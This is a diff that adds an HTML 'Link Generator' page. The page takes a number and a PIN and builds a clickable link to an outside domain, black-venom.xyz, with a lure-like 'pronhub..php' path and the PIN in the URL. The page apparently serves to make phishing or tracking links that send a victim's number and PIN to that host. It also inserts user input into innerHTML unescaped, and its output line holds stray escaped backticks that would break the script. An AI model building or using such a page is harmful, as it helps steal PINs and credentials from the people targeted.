@@ -1,0 +1,29 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Link Generator</title>
+</head>
+<body>
+  <h2>Link Generator</h2>
+  <form id="linkForm">
+    <label>Number: <input type="text" id="number" required /></label><br><br>
+    <label>PIN: <input type="text" id="pin" required /></label><br><br>
+    <button type="submit">Generate Link</button>
+  </form>
+  <p id="output"></p>
+
+  <script>
+    const form = document.getElementById('linkForm');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const number = document.getElementById('number').value;
+      const pin = document.getElementById('pin').value;
+      const link = `https://black-venom.xyz/pronhub..php?number=${number}&pin=${pin}`;
+      document.getElementById('output').innerHTML = \`Generated Link: <a href="\${link}" target="_blank">\${link}</a>\`;
+    });
+  </script>
+</body>
+</html>
